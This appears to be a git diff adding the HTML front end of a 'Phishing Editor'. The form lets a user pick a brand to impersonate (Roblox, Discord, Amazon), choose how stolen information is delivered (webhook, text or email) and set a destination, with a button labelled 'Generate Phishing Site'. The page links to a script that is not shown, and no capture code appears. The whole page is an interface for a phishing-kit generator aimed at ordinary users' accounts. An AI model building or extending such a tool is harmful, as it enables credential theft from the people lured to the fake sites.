@@ -1,12 +1,41 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <title>Physing Editor</title>
-  </head>
-  <body>
-    <div class="form">
-      <form>
-        <input type="text" placeholder"Enter website: roblox, discord, ">
-      </form>
-  </body>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phishing Editor</title>
+    <link rel="stylesheet" href="physing.css"> <!-- Link to your CSS -->
+</head>
+<body>
+
+    <div class="form-container">
+        <h1>Phishing Editor</h1>
+        <p>Configure your custom phishing site settings.</p>
+        
+        <form id="phishing-form">
+            <div class="form-group">
+                <label for="website">Website (e.g., roblox, discord, amazon):</label>
+                <input type="text" id="website" name="website" placeholder="Enter website" required>
+            </div>
+
+            <div class="form-group">
+                <label for="info-type">How would you like the information to be transferred?</label>
+                <select id="info-type" name="info-type" required>
+                    <option value="webhook">Webhook</option>
+                    <option value="text">Text</option>
+                    <option value="email">Email</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label for="destination">Destination (Optional):</label>
+                <input type="text" id="destination" name="destination" placeholder="Enter destination URL/Email/Phone" required>
+            </div>
+
+            <button type="submit">Generate Phishing Site</button>
+        </form>
+    </div>
+
+    <script src="physing.js"></script> <!-- Link to your JS file -->
+</body>
 </html>
